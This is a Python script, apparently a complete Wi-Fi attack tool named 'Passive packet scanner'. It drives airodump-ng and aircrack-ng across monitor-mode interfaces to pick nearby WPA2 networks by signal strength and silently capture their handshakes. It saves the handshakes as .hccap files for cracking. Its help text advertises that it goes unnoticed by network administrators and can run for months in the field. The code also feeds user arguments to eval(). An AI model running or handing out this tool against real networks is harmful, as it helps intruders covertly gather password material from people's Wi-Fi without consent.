#!/usr/bin/env python

###  Passive hash capture tool  #
##       { VERSION 2.3 }       ##
#           By D3faIt         ###


import os
import subprocess
import time
import signal
import glob, os.path
import sys
from datetime import datetime
import random
import shutil
import glob
import threading
import re
import uuid

datafolder = "/root/passive/"

def colors(thacolor):
	if use_no_colors == True:
		return ""
	elif thacolor == "reset":
		return '\033[0m'
	elif thacolor == "black":
		return '\033[30m'
	elif thacolor == "red":
		return '\033[31m'
	elif thacolor == "green":
		return '\033[32m'
	elif thacolor == "orange":
		return '\033[33m'
	elif thacolor == "blue":
		return '\033[34m'
	elif thacolor == "purple":
		return '\033[35m'
	elif thacolor == "cyan":
		return '\033[36m'
	elif thacolor == "lightgrey":
		return '\033[37m'
	elif thacolor == "darkgrey":
		return '\033[90m'
	elif thacolor == "lightred":
		return '\033[91m'
	elif thacolor == "lightgreen":
		return '\033[92m'
	elif thacolor == "yellow":
		return '\033[93m'
	elif thacolor == "lightblue":
		return '\033[94m'
	elif thacolor == "pink":
		return '\033[95m'
	elif thacolor == "lightcyan":
		return '\033[96m'

def helpmenu():
	print(" -- passive-packet-scanner -- ")
	print(" [Description]:")
	print("  Passive packet scanner is a cli script meant to capture WPA handshakes without deauth.")
	print("  The script will utilize the wifi monitor interfaces, and silently listen to the closest hotspot.")
	print("  Multiple interfaces is recommended.")
	print("  You can start the script and have it run for hours/days/months.")
	print("  Should work \"out in the fields\" / \"on the move\", or just sitting in one place.")
	print("  Again, the script does not utilize deauthentication, and should go un-noticed by any admin")
	print("")
	print(" [Usage]:")
	print("  passive [OPTIONS]")
	print("  python passive.py [OPTIONS]")
	print("")
	print(" [Options]:")
	print("Option          Meaning")
	print(" -h, --help      Displays this help menu")
	print(" -a              use all available wifi monitoring interfaces already set in monitor mode (Default: user input choice)")
	print(" -A              use all available wifi monitoring interfaces (Default: user input choice)")
	print(" -i              Specify network interfaces to use (Default: user input choice)")
	print(" -s              Specify seconds for scanning (Default: 60)")
	print(" -c              Specify seconds for capturing (Default: 60*3)")
	print(" -t              Specify seconds before giving up on capturing, and looks for another hotspot (Default: 60*10)")
	print(" -o              Specify output folder for success handshakes captured (Default: /root/passive/captures)")
	print(" -v, --version   Displays the version")
	print("")
	print(" [Extra options]:")
	print("Option          Meaning")
	print(" --no-colors     Disable colors (Default: False)")
	print(" --loop          Specify seconds for main loop (value must be more than 0) (Default: 5)")
	print(" --uninstall     Removes folders and files related to the script except itself")
	print("")
	print(" [Examples]:")
	print("  python passive.py -A -s 60*2 -c 60*3 -t 60*10 --loop 4 --no-colors")
	print("  passive -A -t 60*60*2 --no-colors")
	print("  passive -A -o /tmp")
	print("  passive -a -o /root/Documents/captures/")
	print("  passive -i wlan0mon wlan1mon wlan2mon -c 60*60")

def firsttime():
	if os.path.isdir(datafolder) == False:
		print ("Creating directory: "+datafolder)
		os.makedirs(datafolder)
	if os.path.isdir(datafolder+"active/") == False:
		print ("Creating directory: "+datafolder+"active/")
		os.makedirs(datafolder+"active/")
	if os.path.isdir(datafolder+"captures/") == False:
		print ("Creating directory: "+datafolder+"captures/")
		os.makedirs(datafolder+"captures/")
	if os.path.isfile(datafolder+"blacklist.txt") == False:
		print ("Creating file: "+datafolder+"blacklist.txt")
		f = open(datafolder+"blacklist.txt","a")
		f.write(
			"## BLACKLIST LIST\n"+
			"##   The script will blacklist WIFI networks if a captured hash is found\n"+
			"##   You might also want to add your own\n"+
			"##   Add either BSSID example: \"D4:41:FC:64:66:CE\" or ESSID example: \"YourWifiName\" (without quotes)\n"
			)
		f.close()
	print ("Cloning file: "+os.path.realpath(__file__)+" ==> /usr/bin/passive")
	shutil.copy(__file__, '/usr/bin/passive')
	print ("Changing filepermission to 0755 for /usr/bin/passive")
	subprocess.call(['chmod', '+x', '/usr/bin/passive'])
	print ("\n[+] Successfully installed")
	print ("Run with this command:")
	print ("  passive")
	print ("Or just continue using \"python " + os.path.realpath(__file__) + "\"")
	exit()

def pwr_to_percent(pwr):
	# I didn't bother to write the algorythm for this
	# the power to percent ratio should be a curve that slows down the better the signal is
	# https://www.intuitibits.com/2016/03/23/dbm-to-percent-conversion/
	tmpnum = int(pwr)*-1
	if tmpnum > 93:
		return 0.01
	elif tmpnum < 21:
		return 1.00
	dbms = [1.00,1.00,1.00,1.00,1.00,1.00,1.00,1.00,1.00,1.00,1.00,1.00,1.00,1.00,1.00,1.00,1.00,1.00,1.00,1.00,0.99,0.99,0.99,0.98,0.98,0.98,0.97,0.97,0.96,0.96,0.95,0.95,0.94,0.93,0.93,0.92,0.91,0.90,0.90,0.89,0.88,0.87,0.86,0.85,0.84,0.83,0.82,0.81,0.80,0.79,0.78,0.76,0.75,0.74,0.73,0.71,0.70,0.69,0.67,0.66,0.64,0.63,0.61,0.60,0.58,0.56,0.55,0.53,0.51,0.50,0.48,0.46,0.44,0.42,0.40,0.38,0.36,0.34,0.32,0.30,0.28,0.26,0.24,0.22,0.20,0.17,0.15,0.13,0.10,0.08,0.06,0.03,0.01,0.01,0.01,0.01,0.01,0.01,0.01,0.01]
	return dbms[tmpnum]

def toggle_mon(interface):
	if "mon" in interface:
		os.system("airmon-ng stop "+interface)
	else:
		os.system("airmon-ng start "+interface)

def getTime():
	return datetime.today().strftime('%Y%m%d %H:%M:%S')

def boxprint(text):
	clockstring = colors("orange") + "[" + colors("reset") + getTime() + colors("orange") + "] " + colors("reset")
	for line in text.split("\n"):
		print(clockstring + line)

def file_get_contents(filename):
	with open(filename) as f:
		return f.read()

def getblacklist():
	rawblacklist = file_get_contents(datafolder+"blacklist.txt")
	blacklist = []
	for line in rawblacklist.split("\n"):
		if "#" in line:
			line = line.split("#")[0]
		if line.strip() != "":
			blacklist.append(line.strip())
	return blacklist

def csv_to_array(text):
	temparray = []
	for elm in text.split(","):
		temparray.append(elm.strip())
	return temparray

def clean_capture(interface):
	files = [
		"cap-"+interface+"-01.cap",
		"cap-"+interface+"-01.csv",
		"cap-"+interface+"-01.kismet.csv",
		"cap-"+interface+"-01.kismet.netxml",
		"cap-"+interface+"-01.log.csv"
	]
	for file in files:
		os.remove(datafolder+"active/"+interface+"/"+file)

def complete_clean(interface):
	for file in glob.glob(datafolder+"active/"+interface+"/*"):
		boxprint(colors("cyan") + "Deleting: " + colors("reset") + file)
		if os.path.isfile(file) == True:
			os.remove(file)
		if os.path.isdir(file) == True:
			shutil.rmtree(file)

def formatName(name):
	return re.sub(r'\W+', '', name)

def updateAllDetectedNetworks(networks):
	for elm in networks:
		found = False
		for elm2 in allDetectedNetworks:
			if elm[0] == elm2[0]:
				found = True
		if found == False:
			allDetectedNetworks.append(elm)

def findnexttarget(interface):
	boxprint("Looking for target on " + interface)
	time.sleep(2)
	info = file_get_contents(datafolder+"active/"+interface+"/scan-"+interface+"-01.csv")
	info = info.strip()
	info_array = []
	blacklist = getblacklist()
	busy = []
	for elm in active:
		if elm[0] != interface:
			busy.append(elm[3])

	skipfirstline=True
	for line in info.split("\n"):
		if line.strip() == "":
			break
		if skipfirstline==True:
			skipfirstline=False
			continue
		if "WPA2" not in line:
			continue
		if line.split(",")[6].strip() == "CCMP TKIP":
			continue
		ESSID = line.split(",")[-2].strip()
		BSSID = line.split(",")[0].strip()
		found = False
		for elm in busy + blacklist:
			if elm.lower() == ESSID.lower():
				found = True
			elif elm.lower() == BSSID.lower():
				found = True
		if found == True:
			continue
		line+=","

		info_array.append(csv_to_array(line))

		c=0
		for elm in info_array:
			info_array[c][-1] = float(info_array[c][9])*pwr_to_percent(info_array[c][8])
			c+=1

	updateAllDetectedNetworks(info_array)

	info_array.sort(key=lambda x:x[-1],reverse=True)

	c=0
	for elm in active:
		if elm[0] == interface:
			if len(info_array) == 0:
				boxprint(colors("orange") + "No available networks found for " + interface + colors("reset"))
				active[c] = [interface, 0, timegiveup, "", "", ""]
				complete_clean(interface)
				boxprint("Scanning more " + interface + " (" + str(timescanning) + "s) ...")
				cmd = "airodump-ng -K 1 "+interface+" -w "+datafolder+"active/"+interface+"/scan-"+interface+" -o csv"
				processThread = threading.Thread(target=sendcommand, args=[cmd, interface, timescanning], name=interface).start()
				return
			else:
				score = float(info_array[0][-1])
				# In case the name is empty
				if info_array[0][13] == "":
					info_array[0][13] = "NO_NAME-" + str(uuid.uuid4())
				boxprint("chosing " + colors("cyan") + info_array[0][13] + colors("reset") + ", score: " + str(round(score, 2)))
				active[c][3] = info_array[0][13] # name
				active[c][4] = info_array[0][3]  # channel
				active[c][5] = info_array[0][0]  # BSSID
		c+=1

def thread_running(interface):
	foundthread = False
	for thathread in threading.enumerate():
		if thathread.name == interface:
			foundthread = True
	if foundthread == False:
		return False

def get_wl_interfaces():
	command = "find /sys/class/net -follow -maxdepth 2 -name wireless"
	process = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True, shell=True)
	output = process.communicate()
	stdout = output[0]
	stderr = output[1]

	network_interfaces = []
	for interface in stdout.split("\n"):
		if interface.strip() != "":
			interface = interface.strip().split("/")[-2]
			network_interfaces.append(interface)

	network_interfaces.sort()
	return network_interfaces

def sendcommand(cmd, interface, suicide_watch):
	if suicide_watch == 0:
		subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE)
	else:
		subprocess.Popen(cmd + " & sleep "+str(suicide_watch)+" ; kill $!",shell=True,stdout=subprocess.PIPE)

if os.path.isdir(datafolder) == False and os.path.isfile("/usr/bin/passive") == False:
	firsttime()

def getargument(arguments, arg):
	if arg in arguments:
		c=0
		resultarguments = []
		startadding = False
		for element in arguments:
			if element == arg:
				startadding = True
			elif startadding == True and element[0] == "-":
				return resultarguments
			elif startadding == True:
				resultarguments.append(element)
			c+=1
		return resultarguments



#
##      Code starts here  | | |
###                       v v v
#### -----------------------------------------------------

def main():
	global datafolder, use_no_colors, active, allDetectedNetworks, timegiveup, timescanning

	arguments = sys.argv[1:]
	
	outfolder = datafolder+"captures/"
	use_all_available = False
	use_force_all_available = False
	use_no_colors = False
	interfaces_to_use = []
	
	timescanning = 60*3  # 3 minutes
	timecapture = 60*15  # 15 minutes
	timegiveup = 60*60*2 # 2 hours. Depending on use case, you might want to decreese or increese
	                     # Used outdoors => decrees value (suggest something like 5 minutes)
	                     # Used indoors => increese value (suggest something between 2 hours - 2 days)
	
	thasleep = 5 # time before each loop on all interfaces
	
	if "-h" in arguments or "--help" in arguments:
		helpmenu()
		exit()
	if "--uninstall" in arguments:
		print ("removing " + datafolder)
		shutil.rmtree(datafolder)
		print ("removing /usr/bin/passive")
		os.remove("/usr/bin/passive")
		exit()
	if "-v" in arguments or "--version" in arguments:
		print("Passive Packet Scanner Version: 2.3")
		exit()
	if "-a" in arguments:
		use_all_available = True
	if "-A" in arguments:
		use_force_all_available = True
	if "-i" in arguments:
		interfaces_to_use = getargument(arguments, "-i")
	if "--no-colors" in arguments:
		use_no_colors = True
	if "--loop" in arguments:
		thasleep = eval(getargument(arguments, "--loop")[0])
		if 0 >= thasleep:
			print (colors("red") + "A loop with 0 seconds sleep will most likely max out the CPU, please specify some higher value"+colors("reset"))
			exit()
	if "-s" in arguments:
		timescanning = eval(getargument(arguments, "-s")[0])
	if "-c" in arguments:
		timecapture = eval(getargument(arguments, "-c")[0])
	if "-t" in arguments:
		timegiveup = eval(getargument(arguments, "-t")[0])
		if timecapture > timegiveup:
			print (colors("red") + "Timeout value needs to be higher than capture period"+colors("reset"))
			exit()
	if "-o" in arguments:
		outfolder = getargument(arguments, "-o")[0]
		if outfolder == "":
			print (colors("red") + "No output folder provided ?"+colors("reset"))
			exit()
		if outfolder[-1] != "/":
			outfolder += "/"
		if os.path.isdir(outfolder) == False:
			subprocess.check_output(['mkdir', '-p', outfolder])

	
	
	# start by clearing processes
	for file in glob.glob(datafolder+"active/*"):
		print (colors("cyan") + "Deleting: " + colors("reset") + file)
		if os.path.isfile(file) == True:
			os.remove(file)
		if os.path.isdir(file) == True:
			shutil.rmtree(file)
	
	# Checking for network interfaces in monitor mode
	interface = ""
	network_interfaces = []
	if use_all_available == False and use_force_all_available == False and len(interfaces_to_use) == 0:
		while True:
			network_interfaces = get_wl_interfaces()
			c=0
			print ()
			for interface in network_interfaces:
				indicator = ""
				if "mon" in interface: 
					indicator = colors("cyan")
				print ("[ "+str(c)+" ] " + indicator + interface.split("/")[-1] + colors("reset"))
				c+=1
			user_choise = input(colors("cyan") + "What network interfaces do you want to toggle monitor mode?"+colors("reset")+" ( [0-"+str(c-1)+"]/[EMPTY]/q )\n > ")
			if user_choise == "q":
				exit()
			elif user_choise.isdigit():
				choise = int(user_choise)
				if choise >= 0 and c-1 >= choise:
					toggle_mon(network_interfaces[choise])
			elif user_choise == "":
				break
	
	if len(interfaces_to_use) != 0:
		network_interfaces = get_wl_interfaces()
		for desiredinterface in interfaces_to_use:
			if desiredinterface not in network_interfaces:
				print(colors("red") + desiredinterface + " is a valid network interface in use" + colors("reset"))
				exit()
		network_interfaces = interfaces_to_use
	
	elif use_force_all_available == True:
		for interface in get_wl_interfaces():
			if "mon" not in interface:
				toggle_mon(interface)
		network_interfaces = get_wl_interfaces()
	
	for interface in network_interfaces:
		if "mon" in interface:
			if not os.path.exists(datafolder+"active/"+interface):
				os.makedirs(datafolder+"active/"+interface)
	
	print (colors("cyan"))
	
	
	print ("/###################################################################################\\")
	print ("|/                                                                                 \\|")
	print ("|                             "+colors("reset")+"Passive packet scanner 2.3"+colors("cyan")+"                            |")
	print ("|\\                                                                                 /|")
	print ("\\###################################################################################/")
	print ()
	
	active = []
	
	#if you have 3 network interfaces, it might look something like this:
	#active = [
	#   0,          1,     2,             3,               4,        5
	#   interface,  state, give up time   focused network  channel,  bssid
	#	["wlan0mon", 0,     7200,          "",              "",       "" ],
	#	["wlan1mon", 0,     7200,          "",              "",       "" ],
	#	["wlan2mon", 0,     7200,          "",              "",       "" ],
	#]
	# state 0: scan
	# state 1: capture
	# state 2: look for handshake
	
	
	allDetectedNetworks = [] # global variable
	
	processThread = threading.Thread();
	
	while True:
		for file in glob.glob(datafolder+"active/*"):
			interface = file.split("/")[-1]
			if interface not in get_wl_interfaces():
				boxprint(colors("red") + interface + " is not a valid interface" + colors("reset"))
				boxprint("deleting " + file)
				shutil.rmtree(file)
				continue
			
			c=0
			found = False
			for elm in active: # for active interfaces
				if elm[0] == interface: # if interface
					if elm[1] == 0: # if in scan mode
						#active[c][2] = active[c][2]-thasleep
						foundthread = False
						for thathread in threading.enumerate():
							if thathread.name == interface:
								foundthread = True
						if foundthread == False:
							active[c][1] = 1
					elif elm[1] == 1: # if in capture mode
						if elm[3] == "": # start for the first time, or when previous network was cracked
							findnexttarget(interface)
							active[c][2] = timegiveup
							tempelm = []
							for elm2 in active: # need to load from active again
								if elm2[0] == interface:
									tempelm = elm2
							if tempelm[5] != "":
								boxprint("starting capture of "+tempelm[3]+" on " + interface + " ("+str(timecapture)+"s) ...")
								cmd = "airodump-ng -K 1 -c "+str(tempelm[4])+" --bssid "+tempelm[5]+" -w "+datafolder+"active/"+interface+"/cap-"+interface + " "+ interface
								processThread = threading.Thread(target=sendcommand, args=[cmd, interface, timecapture], name=interface).start()
						elif os.path.isfile(datafolder+"active/"+interface+"/crack-"+interface+".hccap") == True and thread_running(interface) == False: # this is if cracking failed
							os.remove(datafolder+"active/"+interface+"/crack-"+interface+".hccap")
							boxprint("continuing capture of "+elm[3]+" on " + interface + " ("+str(timecapture)+"s) ...")
							cmd = "airodump-ng -K 1 -c "+str(elm[4])+" --bssid "+elm[5]+" -w "+datafolder+"active/"+interface+"/cap-"+interface + " "+ interface
							processThread = threading.Thread(target=sendcommand, args=[cmd, interface, timecapture], name=interface).start()
	
	
						active[c][2] = active[c][2]-thasleep
						if thread_running(interface) == False:
							if 0 > active[c][2]:
								boxprint(colors("orange") + "No handshake was on "+active[c][3]+" found for " + str(timegiveup) + "s!" + colors("reset"))
								time.sleep(2)
								active[c] = [interface, 0, timegiveup, "", "", ""]
								complete_clean(interface)
								boxprint("Starting scan on " + interface + " (" + str(timescanning) + "s) ...")
								cmd = "airodump-ng -K 1 "+interface+" -w "+datafolder+"active/"+interface+"/scan-"+interface+" -o csv"
								processThread = threading.Thread(target=sendcommand, args=[cmd, interface, timescanning], name=interface).start()
							else:
								active[c][1] = 2
	
					elif elm[1] == 2: # if in look mode
						boxprint("Looking for handshake on " + elm[3])
						cmd = "aircrack-ng -J "+datafolder+"active/"+interface+"/crack-"+interface+" "+datafolder+"active/"+interface+"/cap-"+interface+"-01.cap"
	
						proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
						(out, err) = proc.communicate()
						out = out.decode()
						for line in out.split("\n"):
							line = line.strip()
							if active[c][5] in line and active[c][3] in line:
								boxprint (line.split(active[c][5])[1].strip())
							elif "Key version" in line:
								boxprint (line.split("[*] ")[1])
						if "handshake" in out and not "Key version: 0" in out and "Key version" in out:
							boxprint(colors("green") + "Handshake found for "+elm[3] + colors("reset"))
							formatted_ESSID = formatName(elm[3])
							time.sleep(1)
							boxprint("Saving to "+outfolder+formatted_ESSID)
							shutil.copy2(datafolder+"active/"+interface+"/crack-"+interface+".hccap", outfolder+formatted_ESSID+".hccap")
							shutil.copy2(datafolder+"active/"+interface+"/cap-"+interface+"-01.cap", outfolder+formatted_ESSID+".cap")
							time.sleep(1)
							boxprint("Appending BSSID to blacklist ...")
							with open(datafolder+"blacklist.txt", "a") as myfile:
								myfile.write("\n"+elm[5]+"  # " + formatted_ESSID)
							active[c] = [interface, 0, timegiveup, "", "", ""]
							complete_clean(interface)
							boxprint("Starting scan on " + interface + " (" + str(timescanning) + "s) ...")
							cmd = "airodump-ng -K 1 "+interface+" -w "+datafolder+"active/"+interface+"/scan-"+interface+" -o csv"
							processThread = threading.Thread(target=sendcommand, args=[cmd, interface, timescanning], name=interface).start()
						else:
							boxprint(colors("yellow") + "Nothing found on "+elm[3]+", continue looking..." + colors("reset"))
							if os.path.isfile(datafolder+"active/"+interface+"/crack-"+interface+".hccap") == False:
								open(datafolder+"active/"+interface+"/crack-"+interface+".hccap", 'a').close()
							boxprint("cleaning cap trash in: "+datafolder+"active/"+interface + "/")
							active[c][1] = 1
							clean_capture(interface)
	
					found = True
	
				c+=1
			if found == False:
				active.append([interface, 0, 0, "", "", ""])
				boxprint(colors("cyan") + interface + colors("reset") + " found, initializing scanning")
				boxprint("Starting scan on " + interface + " (" + str(timescanning) + "s) ...")
				cmd = "airodump-ng -K 1 "+interface+" -w "+datafolder+"active/"+interface+"/scan-"+interface+" -o csv"
				processThread = threading.Thread(target=sendcommand, args=[cmd, interface, timescanning], name=interface).start()
				
	
		time.sleep(thasleep)

if __name__ == "__main__":
	try:
		main()
	except Exception as e:
		print (str(e))
		with open(datafolder+"crash.log", "a") as myfile:
			myfile.write("[" + getTime() + "] Application crashed:\n"+str(e) + "\n\n")
